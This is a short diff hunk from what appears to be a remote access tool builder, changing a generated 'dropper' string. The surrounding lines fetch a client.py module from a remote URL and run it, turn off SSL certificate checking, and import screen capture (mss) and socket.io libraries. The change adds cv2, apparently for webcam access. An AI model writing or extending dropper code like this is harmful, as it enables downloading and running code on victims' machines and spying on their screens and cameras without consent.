@@ -219,7 +219,7 @@ def create_moduel(url):
   return module
 create_moduel(url+"client/client.py").run(url, file_path)"""
 
-        dropper = f"""import sys,zlib,base64,marshal,json,urllib,socketio,requests,importlib.util,mss,ssl
+        dropper = f"""import sys,zlib,base64,marshal,json,urllib,socketio,requests,importlib.util,mss,ssl,cv2
 from PIL import Image
 from urllib.request import urlopen
 ssl._create_default_https_context = ssl._create_stdlib_context
